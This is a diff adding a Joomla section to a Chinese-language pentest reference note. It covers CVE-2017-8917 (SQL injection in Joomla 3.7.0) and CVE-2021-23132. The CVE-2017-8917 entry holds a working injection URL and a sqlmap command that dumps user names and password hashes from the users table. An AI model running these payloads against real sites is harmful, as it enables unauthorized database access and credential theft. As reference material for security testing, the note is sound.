@@ -223,3 +223,41 @@ WordPress 是一个开源的内容管理系统(CMS),允许用户构建动态网�
 - POC | Payload | exp
   - [wordpress-dos-poc](https://github.com/roddux/wordpress-dos-poc)
 
+## Joomla 
+
+> 官网 : https://www.joomla.org/
+
+**工具**
+
+- [rezasp/joomscan](https://github.com/rezasp/joomscan) - 效果很差,没啥用
+
+### CVE-2017-8917 Joomla! 3.7 Core SQL 注入
+
+- 简介
+
+  Joomla 于5月17日发布了新版本 3.7.1,本次更新中修复一个高危 SQL 注入漏洞,成功利用该漏洞后攻击者可以在未授权的情况下进行 SQL 注入。
+
+- 影响版本
+
+  - joomla 3.7.0
+
+- 文章
+
+  - [Joomla! 3.7 Core SQL 注入 (CVE-2017-8917)漏洞分析](https://paper.seebug.org/305/)
+
+- POC | Payload | exp
+
+  ```
+  http://你的 IP 地址:端口号/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1)
+  ```
+
+  sqlmap payload
+
+  ```
+  sqlmap -u "http://192.168.1.1/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables -T '#__users' -C name,password --dump
+  ```
+
+### CVE-2021-23132
+
+- POC | Payload | exp
+  - [HoangKien1020/CVE-2021-23132](https://github.com/HoangKien1020/CVE-2021-23132)
